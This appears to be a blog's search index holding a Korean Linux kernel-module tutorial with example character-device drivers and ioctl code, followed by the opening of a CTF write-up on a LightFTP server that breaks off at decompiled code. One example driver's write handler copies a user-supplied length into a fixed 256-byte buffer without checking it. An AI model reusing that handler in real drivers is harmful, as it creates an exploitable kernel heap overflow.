struct file *f); #ifndef CONFIG_MMU unsigned (*mmap_capabilities)(struct file *); #endif ssize_t (*copy_file_range)(struct file *, loff_t, struct file *, loff_t, size_t, unsigned int); int (*clone_file_range)(struct file *, loff_t, struct file *, loff_t, u64); ssize_t (*dedupe_file_range)(struct file *, u64, u64, struct file *, u64); } __randomize_layout; 드라이버가 구현하지 않는 몇몇 기능들도 존재한다. 그런 경우에는 진입점이 NULL로 세팅되어야 한다.\nstruct file_operations fops = { .read = device_read, .write = device_write, .open = device_open, .release = device_release }; 위와 같은 방식으로 사용할 수 있다.\nfile structure 각각의 디바이스들은 linux/fs.h에 정의된 커널의 file 구조체로 표현될 수 있다. 하지만 위의 구조체는 커널 수준에서 사용되므로 유저레벨의 사용 환경에선 확인할 수 없다. file 구조체의 객체는 보통 flip라고 불린다.\nRegistering a Device 시스템에 드라이버를 설치한다는 것은 커널에 등록을 해야한다는 것을 의미한다. 이 말은 모듈의 초기화 동안 major number를 드라이버에 할당한다는 것과 같은 의미이다.\nregister_chrdev() register_chrdev 함수를 보면 다음과 같다.\nint register_chrdev(unsigned int major, const char *name, struct file_operations *fops); 커널에 디바이스 드라이버의 major number를 등록한다.\n이때 minor number를 넘기지 않는 이유는 커널이 나중에 디바이스 파일을 이 major number를 보고 저기로 넘기기 때문이다. minor number는 그냥 device files를 만들때 필요하다. 드라이버가 처리하기 위해 fops 등록하는 역할이다.\n중복을 막기 위해서 register_chrdev 함수에 0을 전달하면, 커널은 동적으로 할당한 major number를 리턴한다.\nregister_chrdev()대신 요즘엔 register_chrdev_region, alloc_chrdev_region 들을 써서 minor number도 미리 예약한다. device 파일을 만들려면 major, minor를 다 지정해서 cdev_init/cdev_add 혹은 device_create같은 애들을 사용해서 직접 디바이스 파일을 생성해도된다.\ndev_t Device descriptor type. major, minor 번호가 조합되어있다.\nMAJOR(dev_t dev) MINOR(dev_t dev) MKDEV(int ma, int mi) linux/kdev_t.h에서 정의된 매크로를 확인할 수 있다.\n#define MINORBITS 20 #define MINORMASK ((1U \u0026lt;\u0026lt; MINORBITS) - 1) #define MAJOR(dev) ((unsigned int) ((dev) \u0026gt;\u0026gt; MINORBITS)) #define MINOR(dev) ((unsigned int) ((dev) \u0026amp; MINORMASK)) #define MKDEV(ma,mi) (((ma) \u0026lt;\u0026lt; MINORBITS) | (mi)) cdev 커널 내부적으로 char dev 표현할때 쓰는 구조체이다.\n/* include/linux/cdev.h */ struct cdev { struct kobject kobj; struct module *owner; const struct file_operations *ops; /* 디바이스에서 정의된 file_operations */ struct list_head list; /* cdev 리스트 */ dev_t dev; /* 디바이스 번호 (주번호와 부번호가 각각 저장되어있음) */ unsigned int count; } __randomize_layout; alloc_chrdev_region() alloc_chrdev_region() 은 동적으로 디바이스 번호 할당해주는 함수이다.\nint alloc_chrdev_region(dev_t *dev, unsigned int firstminor, unsigned int count, char* name) 원형은 위와 같다. 동적으로 할당해주기 때문에 미리 디바이스 파일을 못 만든다. /proc/devices 읽고 major number 얻어서 자동으로 등록하는 스크립트를 통해서 해결할 수 있긴 하다.\nregister_chrdev_region() int register_chrdev_region(dev_t first, unsigned int count, char *name); register_chrdev_region() 함수는 디바이스 번호 알고있으면 쓰는 함수다.\ncdev_init() void cdev_init(struct cdev * cdev, const struct file_operations * fops); cdev_init은 cdev 구조체 초기화 해주는 함수다.\ncdev_add() int cdev_add(struct cdev * p, dev_t dev, unsigned count); cdev_add 함수는 디바이스를 등록해주는 함수다.\nclass_create() struct class* class_create(struct module* owner, const char* name) class는 디바이스의 그룹이다. /sys/class 에서 클래스를 확인할 수 있다. 그룹을 나누기 위해 존재하는 것 같다.\ndevice_create() struct device* device_create(struct class* class, struct device parent, dev_t devt, const char* fmt, …) 장치를 생성한다. /dev에 아직 디바이스 파일이 안생겼으니, device_create 함수로 디바이스 파일을 생성할 수 있다.\nTHIS_MODULE #define THIS_MODULE (\u0026amp;__this_module) 이렇게 정의되어있다. 아래 모듈 구조체의 포인터라고 생각하면 된다.\nstruct module { enum module_state state; /* Member of list of modules */ struct list_head list; /* Unique handle for this module */ char name[MODULE_NAME_LEN]; /* Sysfs stuff. */ struct module_kobject mkobj; struct module_attribute *modinfo_attrs; const char *version; const char *srcversion; struct kobject *holders_dir; /* Exported symbols */ const struct kernel_symbol *syms; const s32 *crcs; unsigned int num_syms; /* Kernel parameters. */ #ifdef CONFIG_SYSFS struct mutex param_lock; #endif struct kernel_param *kp; unsigned int num_kp; /* GPL-only exported symbols. */ unsigned int num_gpl_syms; const struct kernel_symbol *gpl_syms; const s32 *gpl_crcs; #ifdef CONFIG_UNUSED_SYMBOLS /* unused exported symbols. */ const struct kernel_symbol *unused_syms; const s32 *unused_crcs; unsigned int num_unused_syms; /* GPL-only, unused exported symbols. */ unsigned int num_unused_gpl_syms; const struct kernel_symbol *unused_gpl_syms; const s32 *unused_gpl_crcs; #endif #ifdef CONFIG_MODULE_SIG /* Signature was verified. */ bool sig_ok; #endif bool async_probe_requested; /* symbols that will be GPL-only in the near future. */ const struct kernel_symbol *gpl_future_syms; const s32 *gpl_future_crcs; unsigned int num_gpl_future_syms; /* Exception table */ unsigned int num_exentries; struct exception_table_entry *extable; /* Startup function. */ int (*init)(void); /* Core layout: rbtree is accessed frequently, so keep together. */ struct module_layout core_layout __module_layout_align; struct module_layout init_layout; /* Arch-specific module values */ struct mod_arch_specific arch; unsigned long taints;\t/* same bits as kernel:taint_flags */ #ifdef CONFIG_GENERIC_BUG /* Support for BUG */ unsigned num_bugs; struct list_head bug_list; struct bug_entry *bug_table; #endif #ifdef CONFIG_KALLSYMS /* Protected by RCU and/or module_mutex: use rcu_dereference() */ struct mod_kallsyms *kallsyms; struct mod_kallsyms core_kallsyms; /* Section attributes */ struct module_sect_attrs *sect_attrs; /* Notes attributes */ struct module_notes_attrs *notes_attrs; #endif /* The command line arguments (may be mangled). People like keeping pointers to this stuff */ char *args; #ifdef CONFIG_SMP /* Per-cpu data. */ void __percpu *percpu; unsigned int percpu_size; #endif #ifdef CONFIG_TRACEPOINTS unsigned int num_tracepoints; struct tracepoint * const *tracepoints_ptrs; #endif #ifdef HAVE_JUMP_LABEL struct jump_entry *jump_entries; unsigned int num_jump_entries; #endif #ifdef CONFIG_TRACING unsigned int num_trace_bprintk_fmt; const char **trace_bprintk_fmt_start; #endif #ifdef CONFIG_EVENT_TRACING struct trace_event_call **trace_events; unsigned int num_trace_events; struct trace_eval_map **trace_evals; unsigned int num_trace_evals; #endif #ifdef CONFIG_FTRACE_MCOUNT_RECORD unsigned int num_ftrace_callsites; unsigned long *ftrace_callsites; #endif #ifdef CONFIG_LIVEPATCH bool klp; /* Is this a livepatch module? */ bool klp_alive; /* Elf information */ struct klp_modinfo *klp_info; #endif #ifdef CONFIG_MODULE_UNLOAD /* What modules depend on me? */ struct list_head source_list; /* What modules do I depend on? */ struct list_head target_list; /* Destruction function. */ void (*exit)(void); atomic_t refcnt; #endif #ifdef CONFIG_CONSTRUCTORS /* Constructor functions. */ ctor_fn_t *ctors; unsigned int num_ctors; #endif #ifdef CONFIG_FUNCTION_ERROR_INJECTION struct error_injection_entry *ei_funcs; unsigned int num_ei_funcs; #endif } ____cacheline_aligned __randomize_layout; 다음과 같은 모듈 구조체를 가리킨다. 말 그대로 THIS_MODULE이다.\n#include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; static int myinit(void) { /* Set by default based on the module file name. */ pr_info(\u0026#34;name = %s\\n\u0026#34;, THIS_MODULE-\u0026gt;name); pr_info(\u0026#34;version = %s\\n\u0026#34;, THIS_MODULE-\u0026gt;version); return 0; } static void myexit(void) {} module_init(myinit) module_exit(myexit) MODULE_VERSION(\u0026#34;1.0\u0026#34;); MODULE_LICENSE(\u0026#34;GPL\u0026#34;); 이런식으로 THIS_MODULE을 쓸 수 있다.\nExample fops - open #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; #define DEVICE_NAME \u0026#34;chardev\u0026#34; #define DEVICE_FILE_NAME \u0026#34;chardev\u0026#34; #define MAJOR_NUM 100 static int chardev_open(struct inode *inode, struct file *file) { printk(\u0026#34;chardev_open\u0026#34;); return 0; } struct file_operations chardev_fops = { .open = chardev_open, }; static int chardev_init(void) { int ret_val; ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, \u0026amp;chardev_fops); if (ret_val \u0026lt; 0) { printk(KERN_ALERT \u0026#34;%s failed with %d\\n\u0026#34;, \u0026#34;Sorry, registering the character device \u0026#34;, ret_val); return ret_val; } printk(KERN_INFO \u0026#34;%s The major device number is %d.\\n\u0026#34;, \u0026#34;Registeration is a success\u0026#34;, MAJOR_NUM); printk(KERN_INFO \u0026#34;If you want to talk to the device driver,\\n\u0026#34;); printk(KERN_INFO \u0026#34;you\u0026#39;ll have to create a device file. \\n\u0026#34;); printk(KERN_INFO \u0026#34;We suggest you use:\\n\u0026#34;); printk(KERN_INFO \u0026#34;mknod %s c %d 0\\n\u0026#34;, DEVICE_FILE_NAME, MAJOR_NUM); printk(KERN_INFO \u0026#34;The device file name is important, because\\n\u0026#34;); printk(KERN_INFO \u0026#34;the ioctl program assumes that\u0026#39;s the\\n\u0026#34;); printk(KERN_INFO \u0026#34;file you\u0026#39;ll use.\\n\u0026#34;); return 0; } static void chardev_exit(void) { unregister_chrdev(MAJOR_NUM, DEVICE_NAME); } module_init(chardev_init); module_exit(chardev_exit); fops 구조체에 .open에 함수 주소를 따로 할당해놓고, device open시 커널 로그를 찍는 예제이다.\nExample fops - open, release, read, write #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; MODULE_LICENSE(\u0026#34;Dual BSD/GPL\u0026#34;); #define DRIVER_NAME \u0026#34;chardev\u0026#34; #define BUFFER_SIZE 256 static const unsigned int MINOR_BASE = 0; static const unsigned int MINOR_NUM = 2; static unsigned int chardev_major; static struct cdev chardev_cdev; static struct class *chardev_class = NULL; static int chardev_open(struct inode *, struct file *); static int chardev_release(struct inode *, struct file *); static ssize_t chardev_read(struct file *, char *, size_t, loff_t *); static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *); struct file_operations chardev_fops = { .open = chardev_open, .release = chardev_release, .read = chardev_read, .write = chardev_write, }; struct data { unsigned char buffer[BUFFER_SIZE]; }; static int chardev_init(void) { int alloc_ret = 0; int cdev_err = 0; int minor; dev_t dev; printk(\u0026#34;The chardev_init() function has been called.\u0026#34;); alloc_ret = alloc_chrdev_region(\u0026amp;dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME); if (alloc_ret != 0) { printk(KERN_ERR \u0026#34;alloc_chrdev_region = %d\\n\u0026#34;, alloc_ret); return -1; } //Get the major number value in dev. chardev_major = MAJOR(dev); dev = MKDEV(chardev_major, MINOR_BASE); //initialize a cdev structure cdev_init(\u0026amp;chardev_cdev, \u0026amp;chardev_fops); chardev_cdev.owner = THIS_MODULE; //add a char device to the system cdev_err = cdev_add(\u0026amp;chardev_cdev, dev, MINOR_NUM); if (cdev_err != 0) { printk(KERN_ERR \u0026#34;cdev_add = %d\\n\u0026#34;, alloc_ret); unregister_chrdev_region(dev, MINOR_NUM); return -1; } chardev_class = class_create(THIS_MODULE, \u0026#34;chardev\u0026#34;); if (IS_ERR(chardev_class)) { printk(KERN_ERR \u0026#34;class_create\\n\u0026#34;); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); return -1; } for (minor = MINOR_BASE; minor \u0026lt; MINOR_BASE + MINOR_NUM; minor++) { device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, \u0026#34;chardev%d\u0026#34;, minor); } return 0; } static void chardev_exit(void) { int minor; dev_t dev = MKDEV(chardev_major, MINOR_BASE); printk(\u0026#34;The chardev_exit() function has been called.\u0026#34;); for (minor = MINOR_BASE; minor \u0026lt; MINOR_BASE + MINOR_NUM; minor++) { device_destroy(chardev_class, MKDEV(chardev_major, minor)); } class_destroy(chardev_class); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); } static int chardev_open(struct inode *inode, struct file *file) { char *str = \u0026#34;helloworld\u0026#34;; int ret; struct data *p = kmalloc(sizeof(struct data), GFP_KERNEL); printk(\u0026#34;The chardev_open() function has been called.\u0026#34;); if (p == NULL) { printk(KERN_ERR \u0026#34;kmalloc - Null\u0026#34;); return -ENOMEM; } ret = strlcpy(p-\u0026gt;buffer, str, sizeof(p-\u0026gt;buffer)); if(ret \u0026gt; strlen(str)){ printk(KERN_ERR \u0026#34;strlcpy - too long (%d)\u0026#34;,ret); } file-\u0026gt;private_data = p; return 0; } static int chardev_release(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_release() function has been called.\u0026#34;); if (file-\u0026gt;private_data) { kfree(file-\u0026gt;private_data); file-\u0026gt;private_data = NULL; } return 0; } static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) { struct data *p = filp-\u0026gt;private_data; printk(\u0026#34;The chardev_write() function has been called.\u0026#34;); printk(\u0026#34;Before calling the copy_from_user() function : %p, %s\u0026#34;,p-\u0026gt;buffer,p-\u0026gt;buffer); if (copy_from_user(p-\u0026gt;buffer, buf, count) != 0) { return -EFAULT; } printk(\u0026#34;After calling the copy_from_user() function : %p, %s\u0026#34;,p-\u0026gt;buffer,p-\u0026gt;buffer); return count; } static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { struct data *p = filp-\u0026gt;private_data; printk(\u0026#34;The chardev_read() function has been called.\u0026#34;); if(count \u0026gt; BUFFER_SIZE){ count = BUFFER_SIZE; } if (copy_to_user(buf, p-\u0026gt;buffer, count) != 0) { return -EFAULT; } return count; } module_init(chardev_init); module_exit(chardev_exit); IOCTL(input/output control) read, write 오퍼레이션을 통한 읽기 쓰기는 가능할지 몰라도, 하드웨어 제어 및 상태 정보 확인은 불가능하다. ioctl() 함수쓰면 하드웨어 제어가 가능하고, 상태 정보도 얻을 수 있다.\n#include \u0026lt;sys/ioctl.h\u0026gt; int ioctl(int d, int request, ...); 첫번째 인자는 fd, 두번째 인자는 디바이스에게 전달할 명령이다. 개발자의 필요에 따라 추가적인 인자를 생성할 수 있다.\n/usr/include/asm/ioctl.h 헤더파일에 ioctl의 커맨드 번호를 작성하는데 사용해야하는 매크로가 있다. rw에 대한 정보를 담아서 고유한 ioctl 식별자를 만드는걸 도와주기 위한 매크로라고 생각하면 된다.\nMacroDescriptionMacroDescription_IO(int type, int number)type, number 값만 전달하는 단순한 ioctl에 사용됩니다. _IOR(int type, int number, data_type)\u0026nbsp;디바이스 드라이버에서\u0026nbsp;데이터를 읽는 ioctl에 사용됩니다._IOW(int type, int number, data_type)디바이스 드라이버에서\u0026nbsp;데이터를 쓰는 ioctl에 사용됩니다._IORW(int type, int number, data_type)디바이스 드라이버에서 데이터를 쓰고 읽는 ioctl에 사용됩니다. type 디바이스 드라이버에 할당된 8비트 정수이다. number 8비트 정수이다. 디바이스 드라이버내에서 서비스하는 서로 다른 종류의 ioctl 명령마다 각기 다른 고유번호를 가지고 있어야한다. data_type 클라이언트와 드라이버간에 교환되는 바이트 수를 계산하는 데 사용되는 유형 이름이다. Example ioctl #include \u0026lt;linux/init.h\u0026gt; #include \u0026lt;linux/module.h\u0026gt; #include \u0026lt;linux/types.h\u0026gt; #include \u0026lt;linux/kernel.h\u0026gt; #include \u0026lt;linux/fs.h\u0026gt; #include \u0026lt;linux/cdev.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; #include \u0026lt;linux/device.h\u0026gt; #include \u0026lt;linux/slab.h\u0026gt; #include \u0026lt;asm/current.h\u0026gt; #include \u0026lt;linux/uaccess.h\u0026gt; #include \u0026#34;chardev.h\u0026#34; MODULE_LICENSE(\u0026#34;Dual BSD/GPL\u0026#34;); #define DRIVER_NAME \u0026#34;chardev\u0026#34; static const unsigned int MINOR_BASE = 0; static const unsigned int MINOR_NUM = 1; static unsigned int chardev_major; static struct cdev chardev_cdev; static struct class *chardev_class = NULL; static int chardev_open(struct inode *, struct file *); static int chardev_release(struct inode *, struct file *); static ssize_t chardev_read(struct file *, char *, size_t, loff_t *); static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *); static long chardev_ioctl(struct file *, unsigned int, unsigned long); struct file_operations s_chardev_fops = { .open = chardev_open, .release = chardev_release, .read = chardev_read, .write = chardev_write, .unlocked_ioctl = chardev_ioctl, }; static int chardev_init(void) { int alloc_ret = 0; int cdev_err = 0; int minor = 0; dev_t dev; printk(\u0026#34;The chardev_init() function has been called.\u0026#34;); alloc_ret = alloc_chrdev_region(\u0026amp;dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME); if (alloc_ret != 0) { printk(KERN_ERR \u0026#34;alloc_chrdev_region = %d\\n\u0026#34;, alloc_ret); return -1; } //Get the major number value in dev. chardev_major = MAJOR(dev); dev = MKDEV(chardev_major, MINOR_BASE); //initialize a cdev structure cdev_init(\u0026amp;chardev_cdev, \u0026amp;s_chardev_fops); chardev_cdev.owner = THIS_MODULE; //add a char device to the system cdev_err = cdev_add(\u0026amp;chardev_cdev, dev, MINOR_NUM); if (cdev_err != 0) { printk(KERN_ERR \u0026#34;cdev_add = %d\\n\u0026#34;, alloc_ret); unregister_chrdev_region(dev, MINOR_NUM); return -1; } chardev_class = class_create(THIS_MODULE, \u0026#34;chardev\u0026#34;); if (IS_ERR(chardev_class)) { printk(KERN_ERR \u0026#34;class_create\\n\u0026#34;); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); return -1; } device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, \u0026#34;chardev%d\u0026#34;, minor); return 0; } static void chardev_exit(void) { int minor = 0; dev_t dev = MKDEV(chardev_major, MINOR_BASE); printk(\u0026#34;The chardev_exit() function has been called.\u0026#34;); device_destroy(chardev_class, MKDEV(chardev_major, minor)); class_destroy(chardev_class); cdev_del(\u0026amp;chardev_cdev); unregister_chrdev_region(dev, MINOR_NUM); } static int chardev_open(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_open() function has been called.\u0026#34;); return 0; } static int chardev_release(struct inode *inode, struct file *file) { printk(\u0026#34;The chardev_close() function has been called.\u0026#34;); return 0; } static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) { printk(\u0026#34;The chardev_write() function has been called.\u0026#34;); return count; } static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { printk(\u0026#34;The chardev_read() function has been called.\u0026#34;); return count; } static struct ioctl_info info; static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { printk(\u0026#34;The chardev_ioctl() function has been called.\u0026#34;); switch (cmd) { case SET_DATA: printk(\u0026#34;SET_DATA\\n\u0026#34;); if (copy_from_user(\u0026amp;info, (void __user *)arg, sizeof(info))) { return -EFAULT; } printk(\u0026#34;info.size : %ld, info.buf : %s\u0026#34;,info.size, info.buf); break; case GET_DATA: printk(\u0026#34;GET_DATA\\n\u0026#34;); if (copy_to_user((void __user *)arg, \u0026amp;info, sizeof(info))) { return -EFAULT; } break; default: printk(KERN_WARNING \u0026#34;unsupported command %d\\n\u0026#34;, cmd); return -EFAULT; } return 0; } module_init(chardev_init); module_exit(chardev_exit); #ifndef CHAR_DEV_H_ #define CHAR_DEV_H_ #include \u0026lt;linux/ioctl.h\u0026gt; struct ioctl_info{ unsigned long size; char buf[128]; }; #define IOCTL_MAGIC \u0026#39;G\u0026#39; #define SET_DATA _IOW(IOCTL_MAGIC, 2 ,struct ioctl_info) #define GET_DATA _IOR(IOCTL_MAGIC, 3 ,struct ioctl_info) #endif obj-m += chardev.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 유저모드에서 ioctl을 호출하면 sys_ioctl이 호출되고, fops에 등록된 chardev_ioctl이 최종적으로 호출된다. 테스트 코드는 다음과 같다.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026#34;chardev.h\u0026#34; int main() { int fd; struct ioctl_info set_info; struct ioctl_info get_info; set_info.size = 100; strncpy(set_info.buf,\u0026#34;lazenca.0x0\u0026#34;,11); if ((fd = open(\u0026#34;/dev/chardev0\u0026#34;, O_RDWR)) \u0026lt; 0){ printf(\u0026#34;Cannot open /dev/chardev0. Try again later.\\n\u0026#34;); } if (ioctl(fd, SET_DATA, \u0026amp;set_info) \u0026lt; 0){ printf(\u0026#34;Error : SET_DATA.\\n\u0026#34;); } if (ioctl(fd, GET_DATA, \u0026amp;get_info) \u0026lt; 0){ printf(\u0026#34;Error : SET_DATA.\\n\u0026#34;); } printf(\u0026#34;get_info.size : %ld, get_info.buf : %s\\n\u0026#34;, get_info.size, get_info.buf); if (close(fd) != 0){ printf(\u0026#34;Cannot close.\\n\u0026#34;); } return 0; } ","permalink":"https://msh1307.kr/blog/linux_kernel_module_programming/","summary":"Kernel module? 모듈은 사용자의 혹은 커널의 요구로 읽혀지거나 아니면 없어지는 코드들로 이루어진 프로그램의 어떤 한 조각을 의미한다. 커널은 하나의 큰 모듈들의 집합이라고 볼 수 있다. 모듈들을 통해서 필요할때 더 추가, 혹은 제거를 통해서 커널을 재컴파일 혹은 재가동하지 않고도 커널의 기능을 확장하거나 축소시킬 수 있다.\nlsmod insmod rmmod lsmod를 통해서 현재 커널에 있는 모듈들의 정보를 확인할 수 있다. 이때 lsmod는 /proc/modules를 읽고나서 좀 더 예쁘게 바꿔준다. insmod를 통해서 커널에 모듈을 적재할 수 있다.","title":"Linux kernel module programming"},{"content":"NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026amp;\u0026amp;\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026amp;\u0026amp;\\ echo \u0026#34;hello from LightFTP\u0026#34; \u0026gt;\u0026gt; /server/data/hello.txt \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026amp;\u0026amp;\\ unzip LightFTP-2.2.zip \u0026amp;\u0026amp;\\ cd LightFTP-2.2/Source/Release \u0026amp;\u0026amp;\\ make \u0026amp;\u0026amp;\\ cp -a ./fftp /server/ \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ rm -rf LightFTP-2.2 LightFTP-2.2.zip COPY ./flag /flag COPY ./fftp.conf /server/fftp.conf RUN mv /flag /flag.`uuid` \u0026amp;\u0026amp;\\ useradd -M -d /server/ -U ftp WORKDIR /server EXPOSE 2121 CMD [\u0026#34;runuser\u0026#34;, \u0026#34;-u\u0026#34;, \u0026#34;ftp\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;ftp\u0026#34;, \u0026#34;/server/fftp\u0026#34;, \u0026#34;/server/fftp.conf\u0026#34;] /flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있다. flag 파일의 이름을 알아내야할 필요가 있다.\nhttps://github.com/hfiref0x/LightFTP 그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다. 탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.\n소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char *v4; // rbp __int64 v5; // rax char *v6; // r12 int v7; // edi char *v8; // rax char *v9; // rax char *v10; // rax int v11; // ebx pthread_t v12[7]; // [rsp+0h] [rbp-38h] BYREF v12[1] = __readfsqword(0x28u); if ( argc \u0026lt;= 1 ) v4 = (char *)config_init(\u0026#34;fftp.conf\u0026#34;, argv, envp); else v4 = (char *)config_init(argv[1], argv, envp); if ( !v4 ) { __printf_chk(1LL, \u0026#34;Could not find configuration file\\r\\n\\r\\n Usage: fftp [CONFIGFILE]\\r\\n\\r\\n\u0026#34;); if ( g_log != -1 ) close(g_log); LABEL_31: ftp_tls_cleanup(); exit(2); } v5 = x_malloc(\u0026amp;_data_start); g_cfg = (__int64)v4; v6 = (char *)v5; in.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;interface\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) in.s_addr = inet_addr(v6); stru_1011C.s_addr = inet_addr(\u0026#34;0.0.0.0\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;external_ip\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) stru_1011C.s_addr = inet_addr(v6); stru_10120.s_addr = inet_addr(\u0026#34;255.255.255.0\u0026#34;); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;local_mask\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) stru_10120.s_addr = inet_addr(v6); word_10110 = 21; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;port\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10110 = strtoul(v6, 0LL, 10); dword_10108 = 1; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;maxusers\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) dword_10108 = strtoul(v6, 0LL, 10); dword_1010C = 0; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;keepalive\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) dword_1010C = strtoul(v6, 0LL, 10); word_10112 = 1024; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;minport\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10112 = strtoul(v6, 0LL, 10); word_10114 = -1; if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;maxport\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) word_10114 = strtoul(v6, 0LL, 10); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;CATrustFile\u0026#34;, CAFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;ServerCertificate\u0026#34;, CERTFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;Keyfile\u0026#34;, KEYFILE, 4096LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;KeyfilePassword\u0026#34;, KEYFILE_PASS, 256LL); config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;goodbyemsg\u0026#34;, GOODBYE_MSG, 128LL); memset(v6, 0, (size_t)\u0026amp;_data_start); if ( (unsigned int)config_parse(v4, \u0026#34;ftpconfig\u0026#34;, \u0026#34;logfilepath\u0026#34;, v6, (__int64)\u0026amp;_data_start) ) { g_log = open64(v6, 66, 384LL); v7 = g_log; if ( g_log == -1 ) { __printf_chk(1LL, \u0026#34;Error: Failed to open/create log file. Please check logfilepath: %s\\r\\n\u0026#34;, v6); __printf_chk( 1LL, \u0026#34;Possible errors: 1) path is invalid; 2) file is read only; 3) file is directory; 4) insufficient permissions\\r\\n\u0026#34;); LABEL_28: free(v4); if ( g_log != -1 ) close(g_log); free(v6); goto LABEL_31; } } else { __printf_chk(1LL, \u0026#34;WARNING: logfilepath section is not found in configuration. Logging to file disabled.\\r\\n\u0026#34;); v7 = g_log; if ( g_log == -1 ) { LABEL_22: __printf_chk(1LL, \u0026#34;\\r\\n [ LightFTP server v%s ]\\r\\n\\r\\n\u0026#34;, \u0026#34;2.2\u0026#34;); __printf_chk(1LL, \u0026#34;Log file : %s\\r\\n\u0026#34;, v6); if ( getcwd(v6, (size_t)\u0026amp;_data_start) ) __printf_chk(1LL, \u0026#34;Working dir : %s\\r\\n\u0026#34;, v6); if ( argc \u0026lt;= 1 ) __printf_chk(1LL, \u0026#34;Config file : %s/%s\\r\\n\u0026#34;, v6, \u0026#34;fftp.conf\u0026#34;); else __printf_chk(1LL, \u0026#34;Config file : %s\\r\\n\u0026#34;, argv[1]); v8 = inet_ntoa(in); __printf_chk(1LL, \u0026#34;Interface ipv4 : %s\\r\\n\u0026#34;, v8); v9 